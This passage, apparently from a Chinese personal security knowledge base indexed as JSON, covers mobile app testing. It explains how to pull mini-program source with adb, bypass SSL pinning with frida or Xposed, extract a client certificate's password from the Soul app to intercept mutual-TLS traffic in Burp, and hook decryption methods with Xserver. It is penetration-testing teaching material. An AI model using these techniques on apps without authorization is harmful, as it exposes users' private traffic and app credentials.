mp-unpack.Setup.1.1.1.exe mp-unpack-1.1.1.dmg 微信开发者工具调试 可选步骤，一般不需要 下载地址：https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html 调试过程 下载安装后打开，导入反编译的源码 点击编译（不编译看着也比较舒服吧哈哈） 编译完成后就可以自己调试了 如果代码存在混淆等情况，可能编译不成功，不过也不太影响我们测试，因为我们也主要是分析各个接口的东西；如果有加密什么的，能调试就很方便 放一张别人编译成功的图吧 参考 小程序渗透测试-前端打包调试解密 获取支付宝小程序的源码 和微信小程序差不多，只是路径不一样，支付宝小程序的路径为 /data/data/com.eg.android.AlipayGphone/files/nebulaInstallApps 另外具体目录名为小程序tinyAppId值，其中的tar包即为源码文件。tar包未加密，adb pull出来之后直接解压即可 JS美化 源码基本都是前后端分离的前端，所以基本都是js、html什么的，直接看比较费眼睛，结合一下效果挺好。 用微信开发者工具调试，会自动高亮，不过混淆的也不好看 搜索引擎搜索 js在线美化 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-02 22:29:28 Author: aaron Url: https://byaaronluo.github.io/知识库/05.移动安全/06.获取微信小程序源码.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/05.移动安全/07.证书双向验证抓包.html":{"url":"知识库/05.移动安全/07.证书双向验证抓包.html","title":"07.证书双向验证抓包","keywords":"","body":" 证书双向验证抓包 先尝试一下是不是单向验证+SSL pinning来防止抓包的 方法一：Xposed加载JustTrustMe模块 方法二：使用frida的ssl_pinning的js模块 打开soul app，抓包 双向验证抓包开始 直接解压apk 找一下证书 找一下证书密码 反编译分析啥的太麻烦了，不太会，所以还是用frida吧 本地安装并信任证书 burp添加p12证书 验证 证书双向验证抓包 此处以soal app为例 首先需要下载soul app，然后安装 先尝试一下是不是单向验证+SSL pinning来防止抓包的 方法一：Xposed加载JustTrustMe模块 方法二：使用frida的ssl_pinning的js模块 frida -U -l ssl_unpinning.js -f cn.soulapp.android # 注意 -f 后面接的是 package name，从设备中读取的 打开soul app，抓包 提示 400 No required SSL certificate was sent，说明是证书双向验证的 双向验证抓包开始 直接解压apk 找一下证书 如果服务器端会对客户端证书进行校验, 证书应该就直接存放在apk里 证书一般放到目录 /asset 或者 /res/raw 目录下的，如果没找到，可以用 find 找一下后缀为 .cer .p12 .pfx 的文件 这里找到证书为 client.p12 找一下证书密码 在我们要使用该证书的时候, 需要输入安装证书的密码。 找到p12证书的话，可以通过这个证书+密码转换成本机安装的证书格式，比如cer。 反编译分析啥的太麻烦了，不太会，所以还是用frida吧 frida -U -l tracer_keystore.js -f cn.soulapp.android 本地安装并信任证书 burp添加p12证书 打开Burp --> User Options-->Client SSL Certificates --> Add -->Host设置前面返回400的地址，证书类型选 PKCS#12 选择刚才看到的p12证书，然后输入frida提取到的密码。 验证 再次抓包，可见能成功抓取到https的包。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-02 22:30:41 Author: aaron Url: https://byaaronluo.github.io/知识库/05.移动安全/07.证书双向验证抓包.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/05.移动安全/08.Xserver.html":{"url":"知识库/05.移动安全/08.Xserver.html","title":"08.Xserver","keywords":"","body":" Xserver 下载地址 Hook adb端口转发 选择一个app 打开app 打开本地127.0.0.1:8000，即可成功hook的web界面了 使用 模拟器设置好burp代理，打开测试的app 加载所有方法 输入规则过滤，并且hook hook后运行app，发起网络请求 点击decrypt方法 burp中看到的数据，后面app操作中所有解密的地方burp都能看到 作者 版本 说明 修订时间 屈林成 v1.0 投稿 2023-03-31 18:38:03 Xserver 下载地址 xserver Hook adb端口转发 如果转发了8000端口本地还访问不到，那可能因为某些原因它初始化的时候没有在8000上，所以这个时候需要通过找PID的值进行转发。 adb forward tcp:8000 tcp:8000 选择一个app 打开app 打开本地127.0.0.1:8000，即可成功hook的web界面了 使用 模拟器设置好burp代理，打开测试的app 主要介绍两个功能，一个是trace，访问地址是http://localhost:8000/tracer 一个是hook，访问地址是http://localhost:8000/invoke 加载所有方法 可以看到加载了136759个方法。 输入规则过滤，并且hook 这个靠猜，比如decode、decrypt、AES、DES等 hook后运行app，发起网络请求 可以看到明文数据，说明找到了对应的解密方式 点击decrypt方法 进入后，在框内输入加密后的内容，点击invoke即可解密，可以在burp中看到过程 burp中看到的数据，后面app操作中所有解密的地方burp都能看到 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-03-31 18:40:47 Author: aaron Url: https://byaaronluo.github.io/知识库/05.移动安全/08.Xserver.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "}}